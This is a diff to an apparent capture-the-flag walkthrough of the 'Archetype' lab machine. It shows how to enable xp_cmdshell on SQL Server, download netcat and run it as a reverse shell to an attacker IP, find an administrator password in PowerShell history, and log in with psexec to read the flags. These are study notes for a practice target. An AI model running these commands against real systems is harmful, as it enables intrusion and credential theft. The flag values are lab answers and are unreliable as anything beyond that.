@@ -147,4 +147,121 @@ View the full module info with the info, or info -d command.
 
 ```
 Identify that the "xp_cmdshell" command is turned off, preventing command execution.
+```
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'whoami';
+[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+ 
+```
 Research and find the steps to reconfigure the "xp_cmdshell" configuration.
+```
+
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC sp_configure 'show advanced options', '1'
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> RECONFIGURE
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC sp_configure 'xp_cmdshell', '1'
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> RECONFIGURE
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'whoami';
+output              
+-----------------   
+archetype\sql_svc   
+
+NULL                
+
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> 
+```
+Now that command execution is allowed, execute commands on the target machine.
+
+Download the "nc63.exe" file, which is essential for building a reverse shell.
+Set up an HTTP server and configure it to listen on port 80.
+```
+ sudo python3 -m http.server 80
+[sudo] password for parrot: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+```
+sudo nc -lnvp 443
+[sudo] password for parrot: 
+listening on [any] 443 ...
+```
+Host the "nc64.exe" file on the HTTP server.
+Execute the shell by downloading and running the "nc64.exe" file on the target machine.
+
+```
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; wget http://10.10.14.172/nc64.exe -outfile nc64.exe ';
+output   
+------   
+NULL     
+```
+```
+10.129.207.19 - - [01/Oct/2023 11:35:21] "GET /nc64.exe HTTP/1.1" 200 -
+
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; .\nc64.exe -e cmd.exe 10.10.14.172 443';
+```
+```
+connect to [10.10.14.172] from (UNKNOWN) [10.129.207.19] 49678
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\sql_svc\Downloads>
+```
+Utilize the WinPEAS script to further assess the system and identify potential privilege escalation opportunities.
+Upload the WinPEAS script to the target machine and execute it.
+```
+Analyzing Windows Files Files (limit 70)
+    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    C:\Users\Default\NTUSER.DAT
+    C:\Users\sql_svc\NTUSER.DAT
+```
+
+Explore the PowerShell history to find valuable information.
+Discover the administrator password, "MEGACORP_4dm1n!!," within the PowerShell history.
+```
+PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
+cat ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+
+```
+Utilize the "psexec.py" tool from Impacket to connect to the target machine as an administrator.
+
+```
+
+python3 psexec.py administrator@10.129.207.19
+Impacket v0.12.0.dev1+20230928.173259.06217f05 - Copyright 2023 Fortra
+
+Password:
+[*] Requesting shares on 10.129.207.19.....
+[*] Found writable share ADMIN$
+[*] Uploading file HAhjaggI.exe
+[*] Opening SVCManager on 10.129.207.19.....
+[*] Creating service iFPS on 10.129.207.19.....
+[*] Starting service iFPS.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoaim
+'whoaim' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> 
+
+```
+
+Now that administrative access is established, locate and retrieve both the user and administrator flags on the target system.
+
+```
+PS C:\Users\sql_svc\Desktop> cat user.txt
+cat user.txt
+3e7b102e78218e935bf3f4951fec21a3
+
+
+PS C:\Users\Administrator\Desktop> cat root.txt
+b91ccec3305e98240082d4474b848528
+
+```
+
